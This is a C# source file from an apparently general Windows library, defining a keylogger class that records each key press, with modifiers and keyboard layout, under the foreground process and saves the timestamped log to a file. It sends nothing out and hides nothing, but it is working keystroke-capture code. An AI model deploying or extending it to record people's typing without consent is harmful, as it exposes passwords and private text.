using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using nucs.Windows.Processes;
using ProtoBuf;

namespace nucs.Windows.Keyboard.Highlevel {

    [ProtoContract]
    public class KeyloggerTextualizer : KeyboardLogger {
        public event Action<LoggedLine> LineClosed;
        public KeyloggerTextualizer(bool IsConsoleApp = false) : base(IsConsoleApp) {
            base.KeyPress += OnKeyPress;
        }

        [ProtoMember(1)]
        public List<ProcessLog> ActiveLogs = new List<ProcessLog>();

        /// <summary>
        ///     Handles a key press event
        /// </summary>
        private void OnKeyPress(BaseKeyboardManager sender, HotkeyEventArgs args) {
            //handles which process was it hit on,

            var topmost = ProcessFinder.GetForegroundProcess().ToProcessInfo();

            var topmost_log = ActiveLogs.FirstOrDefault(log => log.Process.Equals(topmost));
            if (topmost_log == null) {
                ActiveLogs.Add(topmost_log = new ProcessLog() {Process = topmost});
                topmost_log.LineClosed += line => LineClosed?.Invoke(line);
            }
            //Convert Hotkey to LogKey - includes in keyboardlayout
            var lk = new LogKey { Key = args.Hotkey.Key, Modifiers = args.Hotkey.Modifiers, KeyboardLayout = KeyboardLanguage.GetCurrentKeyboardLayout() }; //67699721 hebrew?
            topmost_log.AddContent(lk);
        }

        public string Output() {
            var sb = new StringBuilder();
            foreach (var p in ActiveLogs.ToArray()) {
                sb.AppendLine("---Process: " + p.Process.Name);
                foreach (var line in p.Logs) {
                    sb.AppendLine($"[{line.EndRecord?.ToString("s")??line.StartRecord?.ToString("s")??""}]"+line.ToStringKeyGuide());
                }
            }
            return sb.ToString();
        }
        
        public void Output(FileInfo fi, bool append=false) {
            Output().SaveAs(fi,append);
        }
        public void Output(FileStream fi, bool append=false) {
            var txt = Encoding.UTF8.GetBytes(Output());
            if (!append)
                fi.SetLength(0);
            fi.Write(txt, 0, txt.Length);
            fi.Flush();
        }
    }
}